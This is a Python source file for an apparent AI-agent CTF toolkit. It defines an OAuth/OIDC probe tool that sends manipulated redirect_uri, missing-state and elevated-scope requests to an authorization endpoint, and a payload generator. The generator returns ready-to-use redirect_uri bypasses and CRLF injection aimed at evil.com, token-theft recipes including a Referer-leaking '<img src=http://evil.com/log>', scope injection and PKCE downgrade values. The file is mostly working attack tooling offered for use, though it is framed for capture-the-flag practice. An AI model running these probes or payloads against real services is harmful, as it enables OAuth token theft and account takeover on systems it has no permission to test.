"""
OAuth/OIDC exploitation tools for CTF solving.

Provides automated OAuth misconfiguration detection and payload generation
for redirect URI manipulation, authorization code interception, scope
escalation, and state/PKCE verification testing.

Appeared in: PortSwigger 2023, corCTF 2023, HTB Uni 2023 (PhantomFeed).
"""

import re
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse

import requests

from ctf_solver.tools.core import parse_json_input


class OAuthProbeTool:
    """
    OAuthProbeTool: detect OAuth/OIDC misconfigurations by probing authorization
    endpoints for common vulnerabilities.

    Tool interface (FAIR-style):
      - `name` and `description` class attributes.
      - `.use(tool_input: str) -> str`, where tool_input is JSON.

    Expected JSON tool_input format:

        {
          "url": "http://target.com/oauth/authorize",
          "client_id": "app-client-id",
          "redirect_uri": "http://target.com/callback",
          "tests": ["redirect_uri", "state", "scope", "open_redirect"],
          "timeout": 10
        }

    Tests:
      - redirect_uri: Test redirect_uri validation with manipulated URIs
      - state: Check if state parameter is enforced (CSRF protection)
      - scope: Test scope escalation (request admin/elevated scopes)
      - open_redirect: Test if authorization endpoint can be used as open redirect
    """

    name: str = "oauth_probe"
    description: str = (
        "Detect OAuth/OIDC misconfigurations by probing the authorization endpoint. "
        "Input must be JSON with 'url' (authorization endpoint), 'client_id', "
        "'redirect_uri' (legitimate callback). Optional: 'tests' (list of test types: "
        "redirect_uri, state, scope, open_redirect; default all), 'timeout' (default 10). "
        "Detects redirect_uri manipulation, missing state parameter enforcement, "
        "scope escalation, and open redirect via OAuth flow."
    )
    parameters_schema = {
        "type": "object",
        "properties": {
            "url": {"type": "string"},
            "client_id": {"type": "string"},
            "redirect_uri": {"type": "string"},
            "tests": {
                "type": "array",
                "items": {
                    "type": "string",
                    "enum": ["redirect_uri", "state", "scope", "open_redirect"],
                },
            },
            "timeout": {"type": "integer", "default": 10},
        },
        "required": ["url", "client_id", "redirect_uri"],
        "additionalProperties": False,
    }
    samples = [
        {
            "url": "http://example.com/oauth/authorize",
            "client_id": "demo",
            "redirect_uri": "http://example.com/callback",
        }
    ]

    # Redirect URI manipulation payloads
    REDIRECT_MANIPULATIONS: List[Tuple[str, str]] = [
        ("{scheme}://{host}/callback?next={evil}", "query param append"),
        ("{scheme}://evil.{host}/callback", "subdomain prepend"),
        ("{scheme}://{host}.evil.com/callback", "domain suffix"),
        ("{scheme}://{host}/callback/../evil", "path traversal"),
        ("{scheme}://{host}/callback%23.evil.com", "fragment injection"),
        ("{scheme}://{host}/callback%40evil.com", "@ injection"),
        ("{scheme}://{host}/callback/..%2F..%2Fevil", "double-encoded traversal"),
        ("http://localhost/callback", "localhost redirect"),
        ("{scheme}://{host}/", "root path redirect"),
        ("{scheme}://{host}/CallBack", "case variation"),
    ]

    # Scope escalation values to test
    SCOPE_ESCALATIONS: List[Tuple[str, str]] = [
        ("openid profile email admin", "admin scope"),
        ("openid profile email write", "write scope"),
        ("openid profile email *", "wildcard scope"),
        ("openid profile email read:admin", "read:admin scope"),
        ("openid profile email user:admin", "user:admin scope"),
    ]

    # Common flag patterns
    FLAG_PATTERNS: List[str] = [
        r"(picoCTF\{[^}]+\})",
        r"(HTB\{[^}]+\})",
        r"(THM\{[^}]+\})",
        r"(FLAG\{[^}]+\})",
        r"(flag\{[^}]+\})",
        r"(CTF\{[^}]+\})",
    ]

    def __init__(self, session: Optional[requests.Session] = None) -> None:
        self.session = session or requests.Session()

    def _extract_flags(self, text: str) -> List[str]:
        flags = []
        for pattern in self.FLAG_PATTERNS:
            for m in re.finditer(pattern, text):
                if m.group(1) not in flags:
                    flags.append(m.group(1))
        return flags

    def _test_redirect_uri(
        self,
        url: str,
        client_id: str,
        redirect_uri: str,
        timeout: int,
    ) -> List[Dict[str, Any]]:
        """Test redirect_uri validation with various manipulations."""
        findings: List[Dict[str, Any]] = []
        parsed = urlparse(redirect_uri)

        for template, desc in self.REDIRECT_MANIPULATIONS:
            manipulated = template.format(
                scheme=parsed.scheme,
                host=parsed.hostname or "localhost",
                evil="http://evil.com",
            )

            params = {
                "response_type": "code",
                "client_id": client_id,
                "redirect_uri": manipulated,
                "scope": "openid",
            }

            try:
                resp = self.session.get(
                    url, params=params, timeout=timeout, allow_redirects=False
                )
                is_redirect = resp.status_code in (301, 302, 303, 307, 308)
                location = resp.headers.get("Location", "")
                accepted = is_redirect and manipulated in location

                if accepted or resp.status_code == 200:
                    findings.append(
                        {
                            "test": "redirect_uri",
                            "manipulation": desc,
                            "payload": manipulated,
                            "status": resp.status_code,
                            "location": location[:200],
                            "accepted": accepted,
                        }
                    )
            except Exception:
                pass

        return findings

    def _test_state_param(
        self,
        url: str,
        client_id: str,
        redirect_uri: str,
        timeout: int,
    ) -> List[Dict[str, Any]]:
        """Test if state parameter is enforced."""
        findings: List[Dict[str, Any]] = []

        # Test without state parameter
        params_no_state = {
            "response_type": "code",
            "client_id": client_id,
            "redirect_uri": redirect_uri,
            "scope": "openid",
        }

        try:
            resp = self.session.get(
                url, params=params_no_state, timeout=timeout, allow_redirects=False
            )
            if resp.status_code != 400:
                findings.append(
                    {
                        "test": "state",
                        "desc": "No state parameter - request not rejected",
                        "status": resp.status_code,
                        "vulnerability": "CSRF via missing state enforcement",
                    }
                )
        except Exception:
            pass

        return findings

    def _test_scope_escalation(
        self,
        url: str,
        client_id: str,
        redirect_uri: str,
        timeout: int,
    ) -> List[Dict[str, Any]]:
        """Test scope escalation."""
        findings: List[Dict[str, Any]] = []

        for scope_value, desc in self.SCOPE_ESCALATIONS:
            params = {
                "response_type": "code",
                "client_id": client_id,
                "redirect_uri": redirect_uri,
                "scope": scope_value,
                "state": "test_state",
            }

            try:
                resp = self.session.get(
                    url, params=params, timeout=timeout, allow_redirects=False
                )
                # If the server doesn't reject elevated scopes, it's interesting
                if resp.status_code not in (400, 403, 401):
                    findings.append(
                        {
                            "test": "scope",
                            "desc": desc,
                            "scope": scope_value,
                            "status": resp.status_code,
                            "accepted": True,
                        }
                    )
            except Exception:
                pass

        return findings

    def _test_open_redirect(
        self,
        url: str,
        client_id: str,
        timeout: int,
    ) -> List[Dict[str, Any]]:
        """Test if the OAuth endpoint can be used as open redirect."""
        findings: List[Dict[str, Any]] = []

        evil_uris = [
            "https://evil.com/steal",
            "javascript:alert(1)",
            "//evil.com/steal",
        ]

        for evil_uri in evil_uris:
            params = {
                "response_type": "code",
                "client_id": client_id,
                "redirect_uri": evil_uri,
            }

            try:
                resp = self.session.get(
                    url, params=params, timeout=timeout, allow_redirects=False
                )
                location = resp.headers.get("Location", "")
                if resp.status_code in (301, 302, 303, 307, 308) and "evil" in location:
                    findings.append(
                        {
                            "test": "open_redirect",
                            "payload": evil_uri,
                            "status": resp.status_code,
                            "location": location[:200],
                        }
                    )
            except Exception:
                pass

        return findings

    def use(self, tool_input: str) -> str:
        data, err = parse_json_input(tool_input, "OAuthProbeTool")
        if err:
            return err
        url = data.get("url")
        if not url or not isinstance(url, str):
            return "[OAuthProbeTool] Error: 'url' (string) is required."

        client_id = data.get("client_id", "test_client")
        redirect_uri = data.get("redirect_uri", "")
        tests = data.get("tests") or ["redirect_uri", "state", "scope", "open_redirect"]
        timeout = data.get("timeout", 10)

        all_findings: List[Dict[str, Any]] = []
        all_flags: List[str] = []

        if "redirect_uri" in tests and redirect_uri:
            findings = self._test_redirect_uri(url, client_id, redirect_uri, timeout)
            all_findings.extend(findings)

        if "state" in tests:
            findings = self._test_state_param(url, client_id, redirect_uri, timeout)
            all_findings.extend(findings)

        if "scope" in tests:
            findings = self._test_scope_escalation(
                url, client_id, redirect_uri, timeout
            )
            all_findings.extend(findings)

        if "open_redirect" in tests:
            findings = self._test_open_redirect(url, client_id, timeout)
            all_findings.extend(findings)

        # Build output
        lines = [
            "[OAuthProbeTool] OAuth/OIDC Probe Results",
            "=" * 50,
            f"Authorization URL: {url}",
            f"Client ID: {client_id}",
            f"Redirect URI: {redirect_uri}",
            f"Tests: {', '.join(tests)}",
            "",
        ]

        if all_flags:
            lines.append("!!! FLAGS FOUND !!!")
            for flag in all_flags:
                lines.append(f"  {flag}")
            lines.append("")

        if all_findings:
            lines.append(f"FINDINGS ({len(all_findings)}):")
            lines.append("-" * 40)
            for f in all_findings:
                lines.append(f"  Test: {f['test']}")
                for k, v in f.items():
                    if k != "test":
                        lines.append(f"    {k}: {v}")
                lines.append("")
        else:
            lines.append("No obvious OAuth misconfigurations detected.")
            lines.append("")

        lines.append("RECOMMENDATIONS:")
        has_redirect = any(f["test"] == "redirect_uri" for f in all_findings)
        has_state = any(f["test"] == "state" for f in all_findings)
        has_scope = any(f["test"] == "scope" for f in all_findings)

        if has_redirect:
            lines.append(
                "  - Redirect URI validation is weak! Try chaining with token theft."
            )
            lines.append(
                "  - Use oauth_payload_generator for advanced redirect_uri payloads."
            )
        if has_state:
            lines.append("  - Missing state enforcement allows CSRF on OAuth flow.")
        if has_scope:
            lines.append(
                "  - Scope escalation possible — try requesting admin privileges."
            )
        if not all_findings:
            lines.append("  - Try different client_id values or endpoints.")
            lines.append(
                "  - Check /.well-known/openid-configuration for endpoint discovery."
            )

        return "\n".join(lines)


class OAuthPayloadGenerator:
    """
    OAuthPayloadGenerator: generate OAuth/OIDC exploitation payloads.

    Pure logic tool — no HTTP session required.
    """

    name: str = "oauth_payload_generator"
    description: str = (
        "Generate OAuth/OIDC exploitation payloads. Input must be JSON with "
        "'operation' (one of: redirect_uri_bypass, token_theft, scope_escalation, "
        "pkce_bypass, discovery). Optional: 'redirect_uri' (legitimate callback), "
        "'target' (target domain), 'client_id'. Returns ready-to-use payloads."
    )

    VALID_OPERATIONS = {
        "redirect_uri_bypass",
        "token_theft",
        "scope_escalation",
        "pkce_bypass",
        "discovery",
    }

    def _generate_redirect_uri_bypass(self, redirect_uri: str, target: str) -> str:
        parsed = urlparse(redirect_uri)
        host = parsed.hostname or "target.com"
        scheme = parsed.scheme or "https"

        lines = [
            "=== Redirect URI Bypass Payloads ===",
            f"Legitimate: {redirect_uri}",
            "",
            "--- Path-Based Bypasses ---",
            f"  {scheme}://{host}/callback/../evil",
            f"  {scheme}://{host}/callback/..%2Fevil",
            f"  {scheme}://{host}/callback%2F..%2Fevil",
            f"  {scheme}://{host}/callback/./evil",
            "",
            "--- Parameter Injection ---",
            f"  {scheme}://{host}/callback?next=http://evil.com",
            f"  {scheme}://{host}/callback?url=http://evil.com",
            f"  {scheme}://{host}/callback#@evil.com",
            f"  {scheme}://{host}/callback%23@evil.com",
            "",
            "--- Domain Confusion ---",
            f"  {scheme}://evil.{host}/callback",
            f"  {scheme}://{host}.evil.com/callback",
            f"  {scheme}://{host}%40evil.com/callback",
            f"  {scheme}://{host}%2540evil.com/callback",
            f"  {scheme}://{host}@evil.com/callback",
            "",
            "--- Scheme Tricks ---",
            f"  http://{host}/callback  (downgrade to HTTP)",
            f"  //{host}/callback       (protocol-relative)",
            "",
            "--- Null Byte / Special Chars ---",
            f"  {scheme}://{host}/callback%00.evil.com",
            f"  {scheme}://{host}/callback%0d%0aLocation:%20http://evil.com",
        ]
        return "\n".join(lines)

    def _generate_token_theft(self, redirect_uri: str) -> str:
        lines = [
            "=== Token Theft via OAuth Flow ===",
            "",
            "--- Implicit Grant Token Capture ---",
            "1. Manipulate redirect_uri to attacker-controlled URL",
            "2. Use response_type=token to get access_token in fragment",
            "3. Token appears in URL: http://evil.com/callback#access_token=...",
            "",
            "--- Authorization Code Interception ---",
            "1. Manipulate redirect_uri for code interception",
            "2. Code appears in URL: http://evil.com/callback?code=...",
            "3. Exchange code for token at /token endpoint",
            "",
            "--- Referer Header Leakage ---",
            "1. If redirect page loads external resources",
            "2. Token/code leaks via Referer header",
            "3. Inject external image: <img src=http://evil.com/log>",
            "",
            "--- Open Redirect Chain ---",
            "1. Find open redirect on same domain",
            "2. Use as redirect_uri: /redirect?url=http://evil.com",
            "3. OAuth validates domain, open redirect forwards token",
        ]
        return "\n".join(lines)

    def _generate_scope_escalation(self) -> str:
        lines = [
            "=== Scope Escalation Payloads ===",
            "",
            "--- Common Elevated Scopes ---",
            "  scope=openid profile email admin",
            "  scope=openid profile email write:all",
            "  scope=openid profile email user:admin",
            "  scope=openid+profile+email+admin",
            "  scope=openid%20profile%20email%20admin",
            "",
            "--- Scope Injection ---",
            "  scope=openid&scope=admin   (duplicate param)",
            "  scope=openid%20admin%20    (trailing space)",
            "  scope=openid\\nadmin        (newline injection)",
        ]
        return "\n".join(lines)

    def _generate_pkce_bypass(self) -> str:
        lines = [
            "=== PKCE Bypass Techniques ===",
            "",
            "--- Missing PKCE Enforcement ---",
            "1. Omit code_challenge and code_verifier entirely",
            "2. If accepted, PKCE is not enforced",
            "",
            "--- Downgrade Attacks ---",
            "1. Change code_challenge_method from S256 to plain",
            "2. Send code_challenge = code_verifier (plain method)",
            "",
            "--- Empty/Null Values ---",
            "  code_challenge=",
            "  code_challenge=null",
            "  code_challenge=undefined",
            "  code_verifier=",
        ]
        return "\n".join(lines)

    def _generate_discovery(self) -> str:
        lines = [
            "=== OAuth/OIDC Endpoint Discovery ===",
            "",
            "--- Well-Known Endpoints ---",
            "  /.well-known/openid-configuration",
            "  /.well-known/oauth-authorization-server",
            "  /.well-known/jwks.json",
            "",
            "--- Common OAuth Paths ---",
            "  /oauth/authorize",
            "  /oauth/token",
            "  /oauth/callback",
            "  /oauth/revoke",
            "  /oauth/userinfo",
            "  /api/oauth/authorize",
            "  /auth/authorize",
            "  /connect/authorize",
            "  /auth/realms/{realm}/protocol/openid-connect/auth",
            "",
            "--- Common Parameters ---",
            "  response_type: code, token, id_token",
            "  grant_type: authorization_code, client_credentials, password",
            "  client_id, client_secret, redirect_uri, scope, state, nonce",
        ]
        return "\n".join(lines)

    def use(self, tool_input: str) -> str:
        data, err = parse_json_input(tool_input, "OAuthPayloadGenerator")
        if err:
            return err
        operation = (data.get("operation") or "").strip().lower()
        if not operation:
            return (
                "[OAuthPayloadGenerator] Error: 'operation' required. "
                f"Valid: {', '.join(sorted(self.VALID_OPERATIONS))}"
            )

        if operation not in self.VALID_OPERATIONS:
            return (
                f"[OAuthPayloadGenerator] Error: Unknown operation '{operation}'. "
                f"Valid: {', '.join(sorted(self.VALID_OPERATIONS))}"
            )

        redirect_uri = data.get("redirect_uri", "https://target.com/callback")
        target = data.get("target", "target.com")

        lines = [
            "[OAuthPayloadGenerator] OAuth/OIDC Payloads",
            "=" * 50,
            f"Operation: {operation}",
            "",
        ]

        if operation == "redirect_uri_bypass":
            lines.append(self._generate_redirect_uri_bypass(redirect_uri, target))
        elif operation == "token_theft":
            lines.append(self._generate_token_theft(redirect_uri))
        elif operation == "scope_escalation":
            lines.append(self._generate_scope_escalation())
        elif operation == "pkce_bypass":
            lines.append(self._generate_pkce_bypass())
        elif operation == "discovery":
            lines.append(self._generate_discovery())

        return "\n".join(lines)
